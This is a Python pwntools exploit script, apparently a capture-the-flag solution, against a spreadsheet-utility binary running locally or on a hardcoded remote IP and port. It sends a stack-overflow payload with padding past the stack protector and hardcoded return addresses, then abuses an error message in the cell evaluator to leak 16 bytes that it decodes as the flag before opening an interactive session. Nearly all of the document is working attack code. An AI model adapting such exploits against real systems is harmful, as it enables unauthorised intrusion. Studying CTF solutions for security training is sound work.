#!/usr/bin/python
import sys
import argparse
from pwn import *

# setting 
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 64
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

def write_const_data(r, cellnum, value):
  writestr = "w "+ str(cellnum) + " =" + str(value)
  print writestr
  print r.sendline(writestr)

def write_ref_data(r, cellnum, op, cell1, cell2):
  writestr = "w %s %s %s %s" %(str(cellnum), op, cell1, cell2) 
  print writestr
  print r.sendline(writestr)

#--------------------------------------------------------------------------
if __name__ == "__main__":

  parser = argparse.ArgumentParser(description='Exploit the bins.')
  parser.add_argument('--dbg'   , '-d', action="store_true")
  parser.add_argument('--remote', '-r', action="store_true")
  args = parser.parse_args()

  if args.remote:
    r = remote('54.203.154.154',6655)
  else:
    #r = process('./vuln_bin', env={"LD_PRELOAD":libc_path})
    r = process('./spreadsheet')

  if args.dbg:
    gdb.attach(r, """
    vmmap
    b *main
    """)

  # ------------------------------------------------------------------------
  """
Linear spreadsheet utility v12.
Enter commands followed by a newline.
r <cell #> to evaluate a cell.
w <cell #> <expr> to write a cell.
Expressions are: =<constant> | (+|-|*)<cell #> <cell #>
  """
  print r.recvuntil("Please name the sheet:")
  payload  = ''
  payload += 'X' + ('3' * 7)
  payload += 'A' * 8 # stack protector
  #s += add_rip('print_message', 'name_sheet')
  # 401939
  payload += p64(0x401939)

  #s += add_stack('print_message')
  # A*40
  payload += 'A' * 40

  #s += add_rip('setup_sheet', 'print_message')
  # 4019d2
  payload += p64(0x4019d2)

  #s += add_stack('setup_sheet')
  # A*40
  payload += 'A' * 40

  #s += add_rip('safe_input', 'read_input')
  # 4017cf
  payload += p64(0x4017cf)

  print r.sendline(payload)

  write_ref_data(r, 0, '*', 9, 8)
  write_const_data(r, 9, 0)
  
  r.sendline("r 0")

  print r.recvuntil("Error detected! Expected ")
  data1 = r.recvuntil(' ')
  junk = r.recvuntil('but found ')
  data2 = r.recvuntil('\n')

  print data1 + junk + data2
  print "^"*19 + "FLAG is HERE" + "^"*19

  data1 = int(data1)
  data2 = int(data2)

  flag = ""
  for i in range(8):
    flag += chr( (data1 >> i*8) & 0xFF) 
  for i in range(8):
    flag += chr( (data2 >> i*8) & 0xFF) 

  print '\n'*3 
  print '*'*80 
  print "Flag is: %s" %flag
  print '*'*80 

  # Drop to interactive console
  r.interactive()

